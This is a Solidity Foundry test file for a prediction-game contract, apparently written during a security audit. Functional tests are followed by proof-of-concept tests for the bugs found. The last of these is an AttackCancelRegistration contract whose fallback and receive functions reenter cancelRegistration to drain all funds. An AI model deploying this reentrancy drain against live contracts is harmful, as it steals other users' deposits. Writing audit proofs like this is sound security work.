// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract ThePredicterTest is Test {
    error ThePredicter__NotEligibleForWithdraw();
    error ThePredicter__CannotParticipateTwice();
    error ThePredicter__RegistrationIsOver();
    error ThePredicter__IncorrectEntranceFee();
    error ThePredicter__IncorrectPredictionFee();
    error ThePredicter__AllPlacesAreTaken();
    error ThePredicter__PredictionsAreClosed();

    error ScoreBoard__UnauthorizedAccess();

    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public stranger = makeAddr("stranger");

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(
            address(scoreBoard),
            0.04 ether, // e entrance fee
            0.0001 ether // e pred fee
        );
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();
    }

    function test_registration() public {
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        assertEq(stranger.balance, 0.96 ether);
    }

    function test_playersAreLimited() public {
        for (uint256 i = 0; i < 30; ++i) {
            address user = makeAddr(string.concat("user", Strings.toString(i))); // n
            vm.startPrank(user);
            vm.deal(user, 1 ether);
            thePredicter.register{value: 0.04 ether}();
            vm.stopPrank();

            vm.startPrank(organizer);
            thePredicter.approvePlayer(user);
            vm.stopPrank();
        }

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.expectRevert(
            abi.encodeWithSelector(ThePredicter__AllPlacesAreTaken.selector) // n
        );
        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();
    }

    function test_cannotregisterWithIncorrectFee() public {
        vm.expectRevert(
            abi.encodeWithSelector(ThePredicter__IncorrectEntranceFee.selector)
        );
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.03 ether}();
        vm.stopPrank();
    }

    function test_cannotRegisterAfterDeadline() public {
        vm.expectRevert(
            abi.encodeWithSelector(ThePredicter__RegistrationIsOver.selector)
        );
        vm.startPrank(stranger);
        vm.warp(1723752222); // e deadline is 1723737600
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();
    }

    function test_cannotRegisterTwice() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.warp(2);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThePredicter__CannotParticipateTwice.selector
            )
        );
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();
    }

    function test_canRegisterAfterCancelation() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.warp(2);
        thePredicter.cancelRegistration();
        vm.warp(3);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        assertEq(stranger.balance, 0.96 ether);
    }

    function test_unapprovedCanCancel() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.warp(10);
        thePredicter.cancelRegistration();
        vm.stopPrank();

        assertEq(stranger.balance, 1 ether);
    }

    function test_approvedCannotWithdraw() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        vm.warp(2);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.expectRevert(
            abi.encodeWithSelector(
                ThePredicter__NotEligibleForWithdraw.selector
            )
        );
        vm.startPrank(stranger);
        thePredicter.withdraw();
        vm.stopPrank();
    }

    function test_playersCannotSetScore() public {
        vm.expectRevert(
            abi.encodeWithSelector(ScoreBoard__UnauthorizedAccess.selector)
        );
        vm.startPrank(stranger);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        vm.stopPrank();
    }

    function test_scoresAreCorrect() public {
        vm.startPrank(stranger);
        vm.deal(stranger, 0.0003 ether);
        vm.stopPrank();

        vm.warp(2);
        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        vm.stopPrank();
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.warp(3);
        vm.startPrank(organizer);
        scoreBoard.setResult(1, ScoreBoard.Result.Draw);
        vm.stopPrank();
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Second
        );
        vm.stopPrank();

        vm.warp(4);
        vm.startPrank(organizer);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        vm.stopPrank();
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.warp(5);
        vm.startPrank(organizer);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        vm.stopPrank();

        assertEq(scoreBoard.getPlayerScore(stranger), 3);
    }

    function test_predictionFeesWithdrawal() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        vm.warp(2);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        vm.warp(2);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        assertEq(organizer.balance, 0.0002 ether);
    }

    function test_makePredictionWithIncorrectPredictionFee() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        vm.warp(2);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.expectRevert(
            abi.encodeWithSelector(
                ThePredicter__IncorrectPredictionFee.selector
            )
        );
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0002 ether}(
            0,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();
    }

    function test_makePredictionAfterDeadline() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        vm.warp(2);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.warp(1723752222);
        vm.expectRevert(
            abi.encodeWithSelector(ThePredicter__PredictionsAreClosed.selector)
        );
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();
    }

    function test_rewardDistributionWithAllWrongPredictions() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger.balance, 0.9997 ether);

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9997 ether);

        vm.startPrank(stranger3);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger3.balance, 0.9997 ether);

        assertEq(address(thePredicter).balance, 0 ether);
    }

    function test_cannotWithdrawRewardsTwice() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger.balance, 0.9997 ether);

        vm.expectRevert(
            abi.encodeWithSelector(
                ThePredicter__NotEligibleForWithdraw.selector
            )
        );
        vm.startPrank(stranger);
        thePredicter.withdraw();
        vm.stopPrank();
    }

    function test_cannotWithdrawWithNegativePoints() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.expectRevert(
            abi.encodeWithSelector(
                ThePredicter__NotEligibleForWithdraw.selector
            )
        );
        vm.startPrank(stranger);
        thePredicter.withdraw();
        vm.stopPrank();
    }

    function test_rewardsDistributionIsCorrect() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9997 ether);

        vm.startPrank(stranger3);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger3.balance, 1.0397 ether);

        assertEq(address(thePredicter).balance, 0 ether);
    }


    // AUDITING TESTS

    function test_ReentrancyInCancelRegistration() public
    {
        for (uint256 i = 0; i < 20; ++i) {
            address user = makeAddr(string.concat("user", Strings.toString(i)));
            vm.startPrank(user);
            vm.deal(user, 1 ether);
            thePredicter.register{value: 0.04 ether}();
            vm.stopPrank();
        }

        AttackCancelRegistration attackContract = new AttackCancelRegistration(thePredicter);
        address attacker = makeAddr("attacker");
        hoax(attacker, 0.04 ether);

        uint256 startingPredicterBalance = address(thePredicter).balance;
        uint256 startingAttackContractBalance = address(attackContract).balance;
        // attack :)
        attackContract.attack{value: 0.04 ether}();

        uint256 endingPredicterBalance = address(thePredicter).balance;
        uint256 endingAttackContractBalance = address(attackContract).balance;

        console.log("startingPredicterBalance" , startingPredicterBalance);
        console.log("startingAttackContractBalance" , startingAttackContractBalance);
        console.log("endingPredicterBalance" , endingPredicterBalance);
        console.log("endingAttackContractBalance" , endingAttackContractBalance);

        assert(endingPredicterBalance == 0);
        assert(endingAttackContractBalance - startingAttackContractBalance - 0.04 ether == startingPredicterBalance);
    }

    function test_withdrawPredictionFees_1() public
    {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        address stranger4 = makeAddr("stranger4");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger4);
        vm.deal(stranger4, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3); // dont approve stranger4
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9997 ether);

        vm.startPrank(stranger3);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger3.balance, 1.0397 ether);

        assertEq(address(thePredicter).balance, 0 ether);

        // stranger 4 is still a USER and not a PLAYER , so according to documentation , he should be able to withdraw his entrance fee but they cant as showed :-

        vm.expectRevert("Failed to withdraw");
        vm.prank(stranger4);
        thePredicter.cancelRegistration();
    }

    function test_withdrawPredictionFees_2() public
    {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        address stranger4 = makeAddr("stranger4");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger4);
        vm.deal(stranger4, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3); // dont approve stranger4
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9997 ether);

        vm.prank(stranger4);
        thePredicter.cancelRegistration();        

        vm.startPrank(stranger3);
        vm.expectRevert("Failed to withdraw");
        thePredicter.withdraw();
        vm.stopPrank();

    }

    function test_setPredictionHasIncorrectTimeChecks() public
    {
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}(); 
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.warp(1723744800); // 15 August 2024 18:00:00 UTC
        vm.prank(stranger);
        vm.expectRevert(
            abi.encodeWithSelector(ThePredicter__PredictionsAreClosed.selector)
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.Draw
        );

        vm.warp(1723831200); // 16 August 2024 18:00:00 UTC
        vm.prank(stranger);
        vm.expectRevert(
            abi.encodeWithSelector(ThePredicter__PredictionsAreClosed.selector)
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
    }

    function test_withdrawIgnoresOneEdgeCase() public
    {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Second
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Second
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Second
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger);
        vm.expectRevert(); // will revert as maxScore(or totalShares) = 0 , and formula of reward is reward = maxScore <= 0 ? entranceFee : (shares * players.length * entranceFee) / totalShares; ---> here division by 0 will occur hence it will revert.
        thePredicter.withdraw();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.expectRevert();
        thePredicter.withdraw();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.expectRevert();
        thePredicter.withdraw();
        vm.stopPrank();
    }
}










contract AttackCancelRegistration{
    ThePredicter thePredicter;
    constructor(ThePredicter _thePredicter)
    {
        thePredicter = _thePredicter;
    }
    function attack() public payable
    {
        thePredicter.register{value: 0.04 ether}(); // this and the next call will be made by address(this)
        thePredicter.cancelRegistration();
    }
    function stealMoney() internal
    {
        if(address(thePredicter).balance >= 0.04 ether)
        {
            thePredicter.cancelRegistration();
        }
    }
    fallback() external payable
    {
        stealMoney();
    }
    receive() external payable
    {
        stealMoney();
    }
}